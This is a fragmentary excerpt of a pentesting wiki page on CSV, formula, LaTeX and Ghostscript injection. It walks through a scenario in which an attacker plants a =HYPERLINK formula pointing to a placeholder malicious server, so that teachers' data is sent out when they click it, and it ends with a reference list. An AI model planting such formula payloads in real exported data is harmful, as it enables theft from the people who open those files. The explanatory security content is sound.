...
source_url: https://hacktricks.wiki/pentesting-web/formula-csv-doc-latex-ghostscript-injection.html
...
The following example was taken from [https://payatu.com/csv-injection-basic-to-exploit](https://payatu.com/csv-injection-basic-to-exploit)[\[5\]](#references)
...
1. **Injection of Malicious Payload:**  - The attacker submits a student detail form but includes a formula commonly used in spreadsheets (e.g., `=HYPERLINK("<malicious_link>","Click here")` ).
  - This formula is designed to create a hyperlink, but it points to a malicious server controlled by the attacker.
2. The attacker submits a student detail form but includes a formula commonly used in spreadsheets (e.g.,
3. **Exporting Compromised Data:**  - Teachers, unaware of the compromise, use the application’s functionality to export the data into a CSV file.
...
4. **Triggering the Attack:**  - A teacher clicks on the hyperlink, believing it to be a legitimate part of the student’s details.
...
5. **Logging the Data:**  - The attacker’s server receives and logs the sensitive data sent from the teacher’s computer.
...
**Check the** **original post****for further details.**[\[1\]](#references)
...
However, there are other ways to execute commands, so to avoid RCE it’s very important to use `--shell-restricted`.[\[2\]](#references)[\[3\]](#references)[\[4\]](#references)
...
From [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)[\[7\]](#references)
...
**Check** **https://blog.redteam-pentesting.de/2023/ghostscript-overview/**[\[6\]](#references)

## References

- [1] [Data Exfiltration via Formula Injection #Part1](https://notsosecure.com/data-exfiltration-formula-injection-part1)
- [2] [Hacking with LaTeX](https://0day.work/hacking-with-latex/)
- [3] [LaTeX Injection Cheatsheet](https://salmonsec.com/cheatsheet/latex_injection)
- [4] [Pwning coworkers thanks to LaTeX](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)
- [5] [CSV Injection: Basic to Exploit](https://payatu.com/csv-injection-basic-to-exploit)
- [6] [Ghostscript overview](https://blog.redteam-pentesting.de/2023/ghostscript-overview/)
- [7] [LaTeX XSS payloads (@EdOverflow)](https://twitter.com/intigriti/status/1101509684614320130)
